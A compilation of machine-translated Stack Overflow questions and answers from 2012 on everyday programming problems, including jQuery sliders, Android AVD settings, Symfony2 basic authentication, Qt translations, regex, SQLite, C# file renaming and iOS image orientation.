> 
> 赞同：0
> 
> 时间：2012-11-23T14:03:26.443
> 
> 标签：jquery, webkit, caroufredsel

我已经多次使用 carouFredsel 没有问题。但是我有一种用法，它在 Safari 和 Chrome 中对我不起作用，但在 Firefox 中可以正常工作。

这是它的一个孤立版本：[http ://www.myriadeditions.com/?location_id=305](http://www.myriadeditions.com/?location_id=305)

我已经整理了 HTML（它目前通过了验证），但滑块仍然失败。

任何帮助，将不胜感激！！

干杯

编辑：我也尝试过使用更新版本的 jQuery 和滑块

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:25:23.557

如果我在页面全部渲染和加载后应用代码，它对我有用。这让我认为它会干扰您`window.onload`或您的其他`document.ready`.

试着玩弄这些。

我是如何发现的：

1.  我在你的 $('slider1').carouFredSel({..}) 上放了一个断点
2.  在执行之前，在 DOM 中我将 ID 'slider1' 更改为 'slider2'
3.  我继续执行JS
4.  >> jQuery 提示找不到slider1
5.  我将 DOM 改回 'slider1'
6.  我用 $('slider1').carouFredSel({..}) 执行代码（使用你的参数）

然后就可以了。

# android - 处理 Google Cloud Messaging 中的注册错误

> ID：13530672
> 
> 赞同：0
> 
> 时间：2012-11-23T14:03:31.083
> 
> 标签：android, google-cloud-messaging

我正在使用 GCM，我想在注册和安排重试时捕获错误。这种情况在文档中有[描述](http://developer.android.com/guide/google/gcm/adv.html#retry)，但似乎已经过时了。

起初， 中没有`handleRegistration`方法`GCMBaseIntentService`。这不是问题，因为我们有`onError`方法。更大的问题是它不可能被覆盖`onHandleIntent`，因为它被声明为 final。所以，我可以发送重试意图，但我不知道如何正确捕捉它。我怎样才能做到这一点？

还有第二个问题。在文档中建议传递某种验证令牌，这实际上是一个随机长数字。但是我们不能在服务重启后收到重试意图并拥有这个常量的另一个值吗？我们该如何应对这种情况？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-16T12:18:41.127

像往常一样，我自己找到了解决方案。如果有人感兴趣，请参阅[https://github.com/darja/gcmdemo](https://github.com/darja/gcmdemo)。

讲俄语的人也可以阅读[http://megadarja.blogspot.ru/2012/12/google-cloud-messaging.html](http://megadarja.blogspot.ru/2012/12/google-cloud-messaging.html)

# android - AVD Manager 在关闭并重新打开后丢失用户创建的设备定义

> ID：13530675
> 
> 赞同：6
> 
> 时间：2012-11-23T14:03:43.780
> 
> 标签：android, xml, android-emulator, avd

当我在 AVD Manager 中创建一个新的设备定义时，我可以使用这个设备定义创建一个新的 AVD。如果我关闭并重新打开 AVD 管理器，设备定义将丢失，并且创建的 AVD 将获得“可修复”状态。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T14:03:43.780

我通过打开存储设备定义的 devices.xml 并将每个逗号 ',' 替换为点 '.' 解决了这个问题。

```
<d:screen-size>normal</d:screen-size>
<d:diagonal-length>3,70</d:diagonal-length>
<d:pixel-density>hdpi</d:pixel-density>
<d:screen-ratio>long</d:screen-ratio>
<d:dimensions>
    <d:x-dimension>480</d:x-dimension>
    <d:y-dimension>720</d:y-dimension>
</d:dimensions>
<d:xdpi>254,00</d:xdpi>
<d:ydpi>254,00</d:ydpi> 
```

>

```
<d:screen-size>normal</d:screen-size>
<d:diagonal-length>3.70</d:diagonal-length>
<d:pixel-density>hdpi</d:pixel-density>
<d:screen-ratio>long</d:screen-ratio>
<d:dimensions>
    <d:x-dimension>480</d:x-dimension>
    <d:y-dimension>720</d:y-dimension>
</d:dimensions>
<d:xdpi>254.00</d:xdpi>
<d:ydpi>254.00</d:ydpi> 
```

devices.xml 位于 .android\devices.xml

我实现了这个解决方案，比较了用户创建的设备定义和内置的 Google 设备定义。

不知道为什么 AVD Manager 会以这种奇怪的方式保存用户创建的设备定义 XML。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-23T14:32:32.900

这似乎是一个特定于语言环境的错误。我们正在邮件列表中讨论它：[https ://groups.google.com/forum/?fromgroups=#!topic/adt-dev/nfJvhxO8iJk](https://groups.google.com/forum/?fromgroups=#!topic/adt-dev/nfJvhxO8iJk)

正如您所指出的，临时解决方法是创建设备定义，然后编辑`~/android/devices.xml`逗号并将逗号替换为点。

# php - 获取正确的图片网址

> ID：13530681
> 
> 赞同：3
> 
> 时间：2012-11-23T14:03:54.780
> 
> 标签：php

我在下面有这个图片链接：

```
http://ws.assoc-amazon.com/widgets/q?_encoding=UTF8&ASIN=B008EYEYBA&Format=_SL110_&ID=AsinImage&MarketPlace=US&ServiceVersion=20070822&WS=1&tag=mytwitterpage-20 
```

但是如果你点击它并在浏览器中查看它，图像文件的实际 url 是这样的：

```
http://ecx.images-amazon.com/images/I/418lsVTc0aL._SL110_.jpg 
```

知道如何解析上面的图像链接以使用 php 获取实际的 jpg 文件吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T14:07:13.113

```
<?php

function get_url($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_exec($ch);

    if (!curl_errno($ch)) {
        $url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    }

    curl_close($ch);

    return $url;
}

echo get_url("http://ws.assoc-amazon.com/widgets/q?_encoding=UTF8&ASIN=B008EYEYBA&Format=_SL110_&ID=AsinImage&MarketPlace=US&ServiceVersion=20070822&WS=1&tag=mytwitterpage-20"); 
```

[Source](http://wireshock.com/find-redirected-url-using-php-with-this-simple-function/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:07:46.157

Use [`get_headers()`](http://php.net/manual/en/function.get-headers.php), and get the `Location:` header:

```
$headers = get_headers($url);
echo $headers['Location']; 
```

Note:

This is the most basic version and it will work as long as there is only 1 redirect. If you run into more complex issues, use @aykut's solution.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:12:57.167

你也可以这样做：

```
header('Content-type:image/png');
$file=file_get_contents($url); 
```

# c# - 图像按钮和更新面板

> ID：13530682
> 
> 赞同：0
> 
> 时间：2012-11-23T14:03:56.900
> 
> 标签：c#, asp.net, user-controls

我有一个定义如下的图像按钮，

```
<div>
    <asp:ImageButton ID="btn1" runat="server" ImageUrl="/_LAYOUTS/1033/IMAGES/row.png" />
</div>
<div>
    <asp:RequiredFieldValidator runat="server" ID="reqName" ControlToValidate="txtUserEmail" validationGroup="Page"
        ErrorMessage="enter a email" />
    <asp:RegularExpressionValidator ID="RegularExpressionValidator1" runat="server" ValidationExpression="^([\w\.\-]+)@([\w\-]+)((\.(\w){2,3})+)$"
        ControlToValidate="txtUserEmail" ErrorMessage="enter a email">  
    </asp:RegularExpressionValidator>
</div> 
```

现在我在某个地方得到了更新面板，

```
<asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
                <ContentTemplate>
                    <div> // with controls in it that do some calculations without post back 
```

问题是当我的用户控件加载时，如果我尝试计算并按下更新面板中的按钮，它会检查文本框是否为空，然后输入不应发生的电子邮件错误。

现在，如果我添加`validationGroup="Page"`到验证器，它确实可以工作，但它不会检查电子邮件文本框是否为空。

此外，如果我`EnableClientScript=False`再次添加更新面板，但似乎无法验证电子邮件文本框。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:09:26.333

如果您添加`ValidationGroup="Page"`到您的验证器，您还需要将其添加到相关按钮和输入控件，否则验证器将单独在一个组中，无需验证。

```
<div>
    <asp:ImageButton ID="btn1" runat="server" ImageUrl="/_LAYOUTS/1033/IMAGES/row.png" ValidationGroup="Page" />
</div>
<div>
    <asp:RequiredFieldValidator runat="server" ID="reqName" ControlToValidate="txtUserEmail" ValidationGroup="Page" ErrorMessage="enter a email" />
    <asp:RegularExpressionValidator ID="RegularExpressionValidator1" runat="server" ValidationExpression="^([\w\.\-]+)@([\w\-]+)((\.(\w){2,3})+)$" ControlToValidate="txtUserEmail" ValidationGroup="Page" ErrorMessage="enter a email" />
</div> 
```

# security - Symfony2 in_memory 用户提供程序问题

> ID：13530684
> 
> 赞同：5
> 
> 时间：2012-11-23T14:04:09.153
> 
> 标签：security, authentication, symfony, roleprovider, in-memory

`in_memory`我有一个 Symfony2 应用程序，可以从用户提供者加载用户。`security.yml`如下：

```
security:
    encoders:
        Symfony\Component\Security\Core\User\User: plaintext

    role_hierarchy:
        ROLE_ADMIN:       ROLE_USER
        ROLE_SUPER_ADMIN: [ROLE_USER, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]

    providers:
        in_memory:
            users:
                admin: { password: mypassword, roles: [ 'ROLE_ADMIN' ] }

    firewalls:
        dev:
            pattern:  ^/(_(profiler|wdt)|css|images|js)/
            security: false

        login:
            pattern:  ^/demo/secured/login$
            security: false

        secured_area:
            pattern:    ^/
            anonymous: ~
            http_basic:
                realm: "MyApp Realm - Login"

    access_control:
        #- { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY, requires_channel: https }
        #- { path: ^/_internal, roles: IS_AUTHENTICATED_ANONYMOUSLY, ip: 127.0.0.1 }
        - { path: ^/subscription/show, roles: ROLE_ADMIN }
        - { path: ^/send, roles: ROLE_ADMIN } 
```

在我的本地开发环境（Mac Book Pro）中，此配置按预期工作。当我转到 routes`_/send_`或`_/subscription/show_`时，Symfony 要求我登录，如果我输入凭据*admin*和*mypassword*我可以正确查看页面。

但是在*生产*环境（Debian 服务器）中，我必须执行登录才能看到该路由，但相同的用户名和密码不起作用！HTTP 基本身份验证登录提示永远不会消失！我无法理解。

为什么该配置不起作用？总体而言，为什么在我的本地环境中它可以工作而在生产环境中却不行？

我还看到一个问题，我认为它与：[Symfony2 plaintext users don't work](https://stackoverflow.com/questions/11908861/symfony2-plaintext-users-dont-work)相关。我已经尝试了那里列出的所有建议，但其中任何一个都可以解决问题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-24T00:58:31.193

解决了！

问题是生产环境在 FastCGI 中运行 PHP，并且使用这样的配置，您必须将以下行添加到 .htaccess，以便通过 PHP 工作的 http 基本身份验证：

```
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}] 
```

再见！

# c++ - qApp->installTranslator() 和 tr 没有翻译？

> ID：13530690
> 
> 赞同：0
> 
> 时间：2012-11-23T14:04:33.050
> 
> 标签：c++, qt, translation

我正在尝试动态更改我的应用程序语言：

```
void MainWindow::ChangeEvent(QEvent *event, QString *language)
{
    if (event->type() == QEvent::LanguageChange) {
        RetranslateInterface(language);
        //ui.retranslateUi(this);
    }
    QWidget::changeEvent(event);
}

void MainWindow::RetranslateInterface(QString *language) {

    QString lang = language->remove(2, language->length());
    lang = lang.toLower();
    qDebug()<<"lang"<<lang;

    lang = "qt_" + lang + ".qm";
    qDebug()<<"lang"<<lang;

    if ( Translator )
        qApp->removeTranslator( Translator );

    qDebug()<<"Translator->load( lang)"<< Translator->load( QApplication::applicationDirPath()+"/"+ lang);
    qApp->installTranslator( Translator );

    //qDebug()<<"tr >>>>"<<qApp->translate("MainWindow","my english text");
    setWindowTitle(tr("my english text"));

}

void MainWindow::Slot_ChLangue(QAction* Trigaction)
{

    QString Selectedlanguage = Trigaction->text();
    qDebug()<<"selected language"<<Selectedlanguage;

    if (!Selectedlanguage.isEmpty()) {

        QEvent *translate = new QEvent(QEvent::LanguageChange);
        ChangeEvent(translate, &Selectedlanguage);
    }
} 
```

“qt_*.qm”已加载但未`setWindowTitle(tr("my english text"));`设置适当的文本

我在 main 函数中尝试了这个，它也不起作用：

```
QTranslator translator;
       if(QFile::exists(QApplication::applicationDirPath()+"/qt_fr.qm"))
       qDebug()<<"loaded"<<translator.load(QApplication::applicationDirPath()+"/qt_fr.qm");
       app.installTranslator(&translator);
       qDebug()<<"out en français"<<app.tr("my english text"); 
```

我总是用英语得到“我的英文文本”。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:48:43.160

关于您的最新评论：

没有预定义的字典，您需要自己翻译字符串（或让其他人翻译）。

为此，您需要执行以下步骤：

*   在您的代码中调用 tr()
*   将类似的内容添加`TRANSLATIONS += qt_fr.ts`到您的 .pro 文件中
*   调用`lupdate -verbose <yourprofile>.pro`以创建一个 XML 结构的 .ts 文件，其中包含应翻译的文本
*   调用`linguist qt_fr.ts`以启动 Qt Linguist 并轻松翻译字符串
*   从 Qt Linguist 或使用生成 .qm 文件`lupdate`
*   运行应用程序

[这里](http://qt-project.org/doc/qt-4.8/linguist-hellotr.html)有一个使用翻译的教程。

# php - 如何命名正则表达式组？

> ID：13530694
> 
> 赞同：0
> 
> 时间：2012-11-23T14:04:34.203
> 
> 标签：php, regex

我有一个正则表达式：

```
'/ abc \( (complexRegex)(,complexRegex)*? \) /Uux' 
```

匹配类似： abc(complexStructure,complexStructure,complexStructure)

如何不写两次 complexRegex？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:21:19.093

在基本的 PHP 中，没有办法（除了使用 eisberg 建议的变量技巧，但它仍然在正则表达式本身中重复）。在 PHP5 中，我听说他们放入了 Oniguruma（Ruby 1.9 的扩展正则表达式引擎），但我自己没有尝试过，除了 Oniguruma 的 Wikipedia 页面说的内容外，找不到像样的参考资料。如果是真的，你可以有[这个](http://rubular.com/r/ZLNpjcc1g4)：

```
/abc:(?<complexRegex>d.f)(,\g<complexRegex>)*:ghi/ 
```

例如，它将通过为模式 ( ) 指定名称来匹配`"abc:def,daf,dif:ghi"`，而不重复模式 ( )。`d.f``complexRegex`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:11:40.217

您在 PHP 中可以避免通过变量编写 complexRegex！

```
$complexRegex = 'your complexRegex here';

$regex = '/ abc \( (' . $complexRegex . ')(,' . $complexRegex . ')*? \) /Uux'; 
```

另请阅读 PCRE 中的反向引用：[http ://www.php.net/manual/en/regexp.reference.back-references.php](http://www.php.net/manual/en/regexp.reference.back-references.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:07:46.780

You can match 0 or 1 comma with ?

```
'/ abc \((,?(complexRegex))* \)/ 
```

I added white space to make it clearer but you should match any number of white spaces wherever required.

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-23T14:16:46.390

您还可以使用[反向引用](http://www.regular-expressions.info/brackets.html)，例如

```
(x[ms]l).com/\1    

# the \1 is the backreference which matches the first capture group 
```

将匹配

```
xml.com/xml
 and 
xsl.com/xsl 
```

# vb.net - VB.Net 和 google drive sdk

> ID：13530697
> 
> 赞同：1
> 
> 时间：2012-11-23T14:04:53.267
> 
> 标签：vb.net, google-drive-api

我在 VB.Net 中有一个应用程序，可以在 google doc 上下载和上传文档。但是现在 google doc 变成了 google drive。

我使用此代码连接到我的帐户。

* * *

```
Public Class Form1
    Dim DocServices As DocumentsService

Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
    logIn()
End Sub

Sub logIn()
    DocServices = New DocumentsService("DocListUploader")
    DocServices.setUserCredentials(txtUserName.Text, txtPassword.Text)

    Dim docQuery As New DocumentsListQuery
    docQuery.NumberToRetrieve = 1
    DocServices.Query(docQuery)
    getDocList()
End Sub

Sub getDocList()
    Me.lbDocs.Items.Clear()
    Dim resultFeed As DocumentsFeed = Me.theFeed()
    Dim entry As New DocumentEntry
    For Each entry In resultFeed.Entries
        Me.lbDocs.Items.Add(entry.Title.Text)
    Next
End Sub

Function theFeed() As DocumentsFeed
    Dim query As New DocumentsListQuery()
    Dim feed As DocumentsFeed = DocServices.Query(query)
    Return feed
End Function

Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
    If OpenFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
        Dim theFilename As String = OpenFileDialog1.FileName
        Dim theEntry As DocumentEntry
        theEntry = DocServices.UploadDocument(theFilename, Nothing)
    End If
End Sub
End Class 
```

* * *

我想做同样的想法，但使用谷歌驱动器。我没有像[这样](https://developers.google.com/drive/quickstart-cs)在 c# 中找到 vb.net 中的代码。请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T10:58:32.543

您的代码仍然有效。Document List API 不会停止使用，它将访问您在 Google Drive 上的文件。

我不知道VB中是否存在Drive API的实现，如果你真的想使用Drive API，你可能必须手动构建你的HTTP请求

# php - SQLite。更好的是：检查表是否存在，然后创建（或不创建）或“如果不存在则创建表”？

> ID：13530699
> 
> 赞同：0
> 
> 时间：2012-11-23T14:05:04.313
> 
> 标签：php, sqlite, pdo

我已经实现了存储在`SQLite`数据库中的简单缓存。对于一个客户，数据库中有一张表。如果它不存在，我想自动创建这个表。有什么更好的解决方案，使用 query:`SELECT name FROM sqlite_master WHERE type='table' AND name='table_name';`或使用检查表是否存在`CREATE TABLE IF NOT EXISTS table_name (...)`？每次需要缓存时我都必须这样做，所以我想知道哪种方式会更有效，更正确。

我正在使用`PDO`，所以也许有一些更聪明的方法可以做到这一点？

**解决方案：** 用于[`PDO::errorCode`](http://www.php.net/manual/en/pdo.errorcode.php)查找表是否不存在。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T14:16:18.527

我会选择它，`create table if not exists`因为如果你有一天需要它，它将与其他数据库兼容（特别是在 sqlite 的情况下，你不太可能切换，但仍然如此）。

此外，如果您检查`sqlite_master`并没有找到您的表，您需要发送另一个查询来创建它。由于`create table`您只发送一个查询，尽管其中定义了表结构，但如果您的表结构不难生成或预定义，那么每次使用`create table`.

它还取决于您的表不存在的可能性有多大。如果这不太可能并且您只是希望您的应用程序安全且自我维护，您可以假设它们存在并在假设它们存在的查询失败时处理异常以创建表。

# javascript - 提交多个复选框值

> ID：13530700
> 
> 赞同：2
> 
> 时间：2012-11-23T14:05:08.913
> 
> 标签：javascript, jquery, html, forms, checkbox

jQuery：

```
(...)
$('#button_submit').click(function() 
{                           
func(check_box_values) 
}); 
```

html:

```
<form id="myForm">
<label class="checkbox">
<input type="checkbox" name="my_opt[]" value="1">opt1</label>
<label class="checkbox">
<input type="checkbox" name="my_opt[]" value="2">opt2</label>
<label class="checkbox">
<input type="checkbox" name="my_opt[]" value="3">opt3</label>
<input id='my_opt' type='hidden' name='my_opt[]' />
<input type="button" id="button_submit" value="go">
</form> 
```

我怎样才能将这个选中的复选框值传递到那里以使用`func(check_box_values)`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T14:07:30.243

您可以使用以下[`.map()`](http://api.jquery.com/map/)方法：

```
var check_box_values = $('#myForm [type="checkbox"]:checked').map(function () {
    return this.value;
}).get(); 
```

[jsFiddle 演示](http://jsfiddle.net/DADTd/)

### 解释

*   `$('#myForm [type="checkbox"]:checked')`选择属于 的后代`#myForm`、具有`type`值为 的属性`checkbox`并被检查的元素。

*   该`.map()`方法对结果元素进行迭代，并将函数中返回的值（将是`value`元素的 ，因为这里 `this 指的是实际的 DOM 元素）被添加到集合中。

*   最后，`.get()`用于将集合转换为简单的 Javascript 数组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:09:48.077

如果你想要所有的复选框元素（不仅仅是选中的元素），试试这个。这不使用 jQuery。

```
var formEl = document.getElementById('myForm'),
    inputs = formEl.getElementsByTagName('input'),
    numInputs = inputs.length,
    checkboxEls = [];

while(numInputs--) {
    if (inputs[numInputs].getAttribute('type') == 'checkbox') checkboxEls.push(inputs[numInputs]);
}

func(checkboxEls); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:35:59.630

如果要获取复选框的值，可以使用此代码。

```
$("#button_submit").on("click",function(){
    $("#myForm input").each(function(){
         var Check = $('#chkSelect');
         if(Check.is(':checked') == true){
             func(Check.attr('value'));
         }
    });
}); 
```

此代码将在整个表单上创建一个循环并检查复选框是否选中，然后在代码中调用 func 函数。

# c# - 重命名图像文件

> ID：13530706
> 
> 赞同：0
> 
> 时间：2012-11-23T14:05:42.533
> 
> 标签：c#, image, rename

我想重命名一个目录 ( `C:\Users\userPC\Desktop\MATT\PROVA\IMG\AW12`)，其中包含 3.000 个图像文件`C#`。这些图像实际上具有这种类型的名称：

```
area1_area2_area3_area4.jpg 
```

我想把area2和area4组成一个新文件重命名为`area2_area4.jpg`. 这些区域没有固定数量的字符。我能怎么做？我发现这个讨论[重命名服务器目录上的图像文件](https://stackoverflow.com/questions/1603795/rename-image-files-on-server-directory)

但我是一个编程新手，我无法解决我的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:36:37.633

Here is a solution.Please be aware that it will not check before making any mess :)

```
public void rename(String path)
{
  string[] files =System.IO.Directory.GetFiles(path);
  foreach(string s in files)
  {
     string[] ab=s.split('_');
     if(ab.Lenght>3)  
     {
         string newName=ab[1]+ab[3];
         System.IO.File.Move(s,path+newName);
     }
  }
} 
```

You must call the method using this type of parameter

```
rename("C://Users//userPC//Desktop//MATT//PROVA//IMG//AW12//") 
```

The separator can be changed here ->`s.split('_')`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:51:58.893

```
using System.IO;

namespace ConsoleApplication
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // Rename all files in the C:\Temp\ directory.
            Program.RenameFiles(new DirectoryInfo(@"C:\Temp\"));
        }

        public static void RenameFiles(DirectoryInfo path)
        {
            // Does the path exist?
            if (path.Exists)
            {
                // Get all files in the directory.
                FileInfo[] files = path.GetFiles("*.jpg");
                foreach (FileInfo file in files)
                {
                    // Split the filename
                    string[] parts = file.Name.Split('_');
                    // Concatinate the second and fourth part.
                    string newFilename = string.Concat(parts[1], "_", parts[3]);
                    // Combine the original path with the new filename.
                    string newPath = Path.Combine(path.FullName, newFilename);
                    // Move the file.
                    File.Move(file.FullName, newPath);
                }
            }
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:42:06.950

首先获取文件夹中包含的文件名列表

```
var listOfFileNames = Directory.GetFiles(directory); 
```

您提到这些区域没有固定数量的字符（我假设这些区域由下划线字符分隔）。所以将每个文件名分成四个区域，使用下划线字符作为分隔符。

然后建立你的新文件名，例如，

```
foreach(var fileName in listOfFileNames)
{
    var areas = fileName.Split('_');
    var newFileName = string.Format({0}{1}{2}, areas[0], areas[1],".jpg");
} 
```

希望这可以帮助

# ios - Image from UIIMagePicker gets rotated

> ID：13530711
> 
> 赞同：0
> 
> 时间：2012-11-23T14:06:04.127
> 
> 标签：ios, ios5, ios6

I need to get the image from uiimagepicker and need to show it in a uiimageview.It is working perfectly in simulator.But on device,the image from uiimagepicker is rotated.How to resolve this?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:09:36.223

由于手机相机的纵向/横向方向，会出现此问题。重新旋转您的图像

```
CGImageRef imageRef = [sourceImage CGImage];

UIImage *rotatedImage = [UIImage imageWithCGImage:imageRef scale:1.0 orientation:UIImageOrientationUp]; 
```

或尝试这样的事情

```
static inline double radians (double degrees) {return degrees * M_PI/180;}
UIImage* rotate(UIImage* src, UIImageOrientation orientation)
{
    UIGraphicsBeginImageContext(src.size);

    CGContextRef context = UIGraphicsGetCurrentContext();

    if (orientation == UIImageOrientationRight) {
        CGContextRotateCTM (context, radians(90));
    } else if (orientation == UIImageOrientationLeft) {
        CGContextRotateCTM (context, radians(-90));
    } else if (orientation == UIImageOrientationDown) {
        // NOTHING
    } else if (orientation == UIImageOrientationUp) {
        CGContextRotateCTM (context, radians(90));
    }

    [src drawAtPoint:CGPointMake(0, 0)];

    return UIGraphicsGetImageFromCurrentImageContext();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-07-31T14:50:25.857

在使用之前修复图像的方向。使用下面的扩展来修复 UIImage 方向。

```
extension UIImage {

    /// Fix image orientaton to protrait up
    func fixedOrientation() -> UIImage? {
        guard imageOrientation != UIImage.Orientation.up else {
            // This is default orientation, don't need to do anything
            return self.copy() as? UIImage
        }

        guard let cgImage = self.cgImage else {
            // CGImage is not available
            return nil
        }

        guard let colorSpace = cgImage.colorSpace, let ctx = CGContext(data: nil, width: Int(size.width), height: Int(size.height), bitsPerComponent: cgImage.bitsPerComponent, bytesPerRow: 0, space: colorSpace, bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else {
            return nil // Not able to create CGContext
        }

        var transform: CGAffineTransform = CGAffineTransform.identity

        switch imageOrientation {
        case .down, .downMirrored:
            transform = transform.translatedBy(x: size.width, y: size.height)
            transform = transform.rotated(by: CGFloat.pi)
        case .left, .leftMirrored:
            transform = transform.translatedBy(x: size.width, y: 0)
            transform = transform.rotated(by: CGFloat.pi / 2.0)
        case .right, .rightMirrored:
            transform = transform.translatedBy(x: 0, y: size.height)
            transform = transform.rotated(by: CGFloat.pi / -2.0)
        case .up, .upMirrored:
            break
        @unknown default:
            break
        }

        // Flip image if needed to, this is to prevent flipped image
        switch imageOrientation {
        case .upMirrored, .downMirrored:
            transform = transform.translatedBy(x: size.width, y: 0)
            transform = transform.scaledBy(x: -1, y: 1)
        case .leftMirrored, .rightMirrored:
            transform = transform.translatedBy(x: size.height, y: 0)
            transform = transform.scaledBy(x: -1, y: 1)
        case .up, .down, .left, .right:
            break
        @unknown default:
            break
        }

        ctx.concatenate(transform)

        switch imageOrientation {
        case .left, .leftMirrored, .right, .rightMirrored:
            ctx.draw(cgImage, in: CGRect(x: 0, y: 0, width: size.height, height: size.width))
        default:
            ctx.draw(cgImage, in: CGRect(x: 0, y: 0, width: size.width, height: size.height))
            break
        }

        guard let newCGImage = ctx.makeImage() else { return nil }
        return UIImage.init(cgImage: newCGImage, scale: 1, orientation: .up)
    }
} 
```

用法：

```
let fixedImage = myImage.fixedOrientation() 
```

# android - Memory leak in Basic GLSurfaceView for android

> ID：13530714
> 
> 赞同：0
> 
> 时间：2012-11-23T14:06:11.757
> 
> 标签：android, multithreading, opengl-es, memory-leaks, glsurfaceview

I've put together something I call a "ViewManager" from a few OpenGL/Android tutorials. The problem is that I am having a memory leak. I get a GC notification every once in awhile and I don't think I am doing anything.

`11-23 01:50:34.435: D/dalvikvm(954): GC_CONCURRENT freed 381K, 6% free 8024K/8519K, paused 18ms+6ms, total 64ms`

My code starts by extending GLSurfaceView and implementing a CallBack and Runnable. I then have a gameLoop that gets created and started which handles updating the objects.

As you can see from my code, I don't have any objects in the list yet, so the leak is not occuring in the `.draw` or the `.update` methods of an object.

I ran the code with taking out the gameLoop and the memory leak appeared to stop. Does anyone have any hints at why I am receiving a memory leak? On a side note, when I remove the `Thread.sleep(30)` call on the run method, I get the GC_CONCURRENT notification many times faster!

```
import java.util.LinkedList;
import java.util.ListIterator;

import javax.microedition.khronos.egl.EGLConfig;
import javax.microedition.khronos.opengles.GL10;

import android.content.Context;
import android.opengl.GLSurfaceView;
import android.opengl.GLU;
import android.view.MotionEvent;

public class ViewManager extends GLSurfaceView implements Runnable, GLSurfaceView.Renderer
{
    private Camera camera;
    private ListIterator<GameObject> objIterator;
    private LinkedList<GameObject> objects;
    private Thread gameThread;
    private boolean running;

    public ViewManager(Context context)
    {
        super(context);
        setRenderer(this);

        objects = new LinkedList<GameObject>();

        camera = new Camera();
        camera.setPosZ(-4.0f);

    }

    public void onDrawFrame(GL10 gl)
    {
        gl.glClear(GL10.GL_DEPTH_BUFFER_BIT|GL10.GL_COLOR_BUFFER_BIT);

        //3D Drawing
        objIterator = objects.listIterator();
        gl.glLoadIdentity();
        camera.draw(gl);    
        while(objIterator.hasNext())
        {
            gl.glPushMatrix();
            objIterator.next().draw(gl);
            gl.glPopMatrix();
        }
    }

    @Override
    public boolean onTouchEvent(MotionEvent event)
    {
        if(event.getAction() == MotionEvent.ACTION_DOWN)
        {
            camera.getPreviouslyTouchedPoint().set((int)event.getX(),(int)event.getY());
        }

        if(event.getAction() == MotionEvent.ACTION_MOVE)
        {
            camera.setPosX(camera.getPosX() - (camera.getPreviouslyTouchedPoint().x-event.getX())/100f);
            camera.setPosY(camera.getPosY() - (camera.getPreviouslyTouchedPoint().y-event.getY())/100f);
        }

        camera.getPreviouslyTouchedPoint().set((int)event.getX(),(int)event.getY());

        return true;
    }
    public void onSurfaceChanged(GL10 gl, int width, int height)
    {
        running = false;

        gl.glViewport(0,0,width,height);
        gl.glMatrixMode(GL10.GL_PROJECTION);
        gl.glLoadIdentity();
        GLU.gluPerspective(gl, 45.0f, (float)width/(float)height,0.1f,100.0f);
        gl.glMatrixMode(GL10.GL_MODELVIEW);
        gl.glLoadIdentity();

        running = true;
        gameThread = new Thread(this);
        gameThread.start();
    }

    public void onSurfaceCreated(GL10 gl, EGLConfig arg1)
    {
        gl.glShadeModel(GL10.GL_SMOOTH);
        gl.glClearDepthf(1.0f);
        gl.glEnable(GL10.GL_DEPTH_TEST);
        gl.glDepthFunc(GL10.GL_LEQUAL);
        gl.glHint(GL10.GL_PERSPECTIVE_CORRECTION_HINT, GL10.GL_NICEST);
    }

    public void run()
    {
        ListIterator<GameObject> itr = objects.listIterator();

        while(running)
        {
            itr = objects.listIterator();
            while(itr.hasNext())
            {
                itr.next().update(0);
            }
            try
            {
                Thread.sleep(30);
            } catch (InterruptedException e)
            {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T00:16:52.010

内存泄漏和运行 GC 之间总是存在混淆（尽管它们几乎是相反的情况）。当有对阻止 GC 收集这些对象的对象的引用时，就会发生内存泄漏。GC 收集不再被任何活动线程引用的对象（您的`ListIterator`对象就是这种情况）。

线程完成后，`ListIterator`任何活动线程都不再引用您的线程，因此 GC 会收集它。

为了防止GC运行，在线程退出之前（内部`run()`方法）自己删除引用在方法结束时取消这个对象`run()`，或者使用你每次重用的类级别`Iterator`对象（不是每次线程都创建一个新对象运行）。

